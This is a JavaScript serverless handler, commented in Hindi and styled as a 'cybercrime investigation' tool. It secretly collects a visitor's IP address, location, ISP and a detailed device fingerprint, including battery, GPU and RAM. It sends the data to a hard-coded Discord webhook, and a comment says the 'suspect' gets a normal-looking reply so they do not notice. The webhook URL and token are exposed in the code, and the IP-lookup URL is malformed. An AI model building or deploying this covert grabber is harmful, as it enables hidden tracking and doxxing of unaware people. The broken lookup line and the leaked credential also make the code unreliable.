export default async function handler(req, res) {
    // CORS सुरक्षा नीतियां
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            // 1. नेटवर्क लेवल डेटा निकालें
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
            const country = req.headers['x-vercel-ip-country'] || "Unknown Country";
            const city = req.headers['x-vercel-ip-city'] || "Unknown City";
            const userAgentString = req.headers['user-agent'] || "Unknown UA";

            // 2. ब्राउज़र (Client) से भेजा गया हार्डवेयर डेटा
            const hardwareData = req.body || {};

            const timestamp = new Date().toISOString();

            // 🔍 2.5. ISP और ASN लाइव लुकअप फेच करना
            let ispName = "N/A";
            let asnDetails = "N/A";
            try {
                // Vercel हेडर्स में कभी-कभी मल्टीपल IPs होती हैं, इसलिए पहली IP का इस्तेमाल करें
                const targetIp = ip.split(',')[0].trim();
                const ipRes = await fetch(`http://ip-api.com{targetIp}?fields=isp,as`);
                if (ipRes.ok) {
                    const ipData = await ipRes.json();
                    ispName = ipData.isp || "Unknown ISP";
                    asnDetails = ipData.as || "Unknown ASN";
                }
            } catch (e) {
                ispName = "Lookup Timeout/Error";
                asnDetails = "Lookup Timeout/Error";
            }

            // 3. पूरा फोरेंसिक लॉग कंबाइन करें
            const comprehensiveLog = {
                CASE_STATUS: "SUSPECT_INTERACTION_DETECTED",
                TIMESTAMP: timestamp,
                NETWORK: {
                    ip_address: ip,
                    provider_isp: ispName,
                    routing_asn: asnDetails,
                    location: `${city}, ${country}`
                },
                BROWSER_USER_AGENT: userAgentString,
                HARDWARE_FINGERPRINT: {
                    exact_model: hardwareData.exactModel || "N/A",
                    os_version: hardwareData.osVersion || "N/A",
                    gpu_renderer: hardwareData.gpuRenderer || "N/A",
                    cpu_cores: hardwareData.cores || "N/A",
                    ram_memory: hardwareData.ram || "N/A",
                    screen_resolution: hardwareData.screenRes || "N/A",
                    pixel_ratio: hardwareData.pixelRatio || "N/A",
                    timezone: hardwareData.timezone || "N/A",
                    battery_level: hardwareData.batteryLevel || "N/A",
                    is_charging: hardwareData.isCharging || "N/A"
                }
            };

            // 🔥 यह डेटा Vercel के लाइव डैशबोर्ड पर भी प्रिंट होगा
            console.log("==================== CRIMINAL INVESTIGATION DATA ====================");
            console.log(JSON.stringify(comprehensiveLog, null, 2));
            console.log("=====================================================================");

            // 🎨 Discord Fancy Cyber Dashboard Payload Construction
            const discordPayload = {
                username: "🚨 CYBERCRIME INVESTIGATION",
                avatar_url: "https://imgur.com", // डार्क थीम का हकर अवतार
                embeds: [{
                    title: "💥 SUSPECT INTERACTION DETECTED",
                    color: 15548997, // लाल रंग का अलर्ट बॉक्स
                    timestamp: timestamp,
                    footer: { text: "FioMart Forensics Center • Live Intelligence" },
                    fields: [
                        { name: "🌐 NETWORK POINT", value: `**IP Address:** \`${ip}\`\n**Location:** ${city}, ${country}`, inline: false },
                        { name: "📡 TELECOM / ISP INTELLIGENCE", value: `**Provider ISP:** \`${ispName}\`\n**Routing ASN:** \`${asnDetails}\``, inline: false },
                        { name: "💻 DEVICE FINGERPRINT", value: `**Exact Model:** ${hardwareData.exactModel || "N/A"}\n**OS Version:** ${hardwareData.osVersion || "N/A"}\n**Timezone:** ${hardwareData.timezone || "N/A"}`, inline: true },
                        { name: "🔋 POWER STATUS", value: `**Battery Level:** \`${hardwareData.batteryLevel || "N/A"}\`\n**Charging:** ${hardwareData.isCharging || "N/A"}`, inline: true },
                        { name: "🛠️ HARDWARE DIAGNOSTICS", value: `**CPU Cores:** ${hardwareData.cores || "N/A"} Cores\n**RAM Memory:** ${hardwareData.ram || "N/A"} GB\n**Resolution:** ${hardwareData.screenRes || "N/A"}`, inline: false },
                        { name: "🖥️ GPU RENDERER", value: `\`\`\`text\n${hardwareData.gpuRenderer || "N/A"}\n\`\`\``, inline: false },
                        { name: "🌎 BROWSER USER AGENT", value: `\`\`\`text\n${userAgentString}\n\`\`\``, inline: false }
                    ]
                }]
            };

            // 📡 Discord सर्वर को लाइव अलर्ट भेजना
            const discordWebhookUrl = "https://discord.com/api/webhooks/1547324422631727185/KUjrrOelPGcmiPzBVfcnVtm6RmWO9BEyUA3U6GuJ7lcHjZJipyT5xDMRgE7DvEO7cbfK"; 
            
            await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

            // संदिग्ध को सामान्य रिस्पॉन्स दें ताकि उसे कोई शक न हो
            return res.status(200).json({ status: "processed" });
        } catch (err) {
            console.error("Internal Server Logger Error:", err.message);
            return res.status(500).json({ error: err.message });
        }
    }

    return res.status(405).json({ error: "Method not allowed" });
}
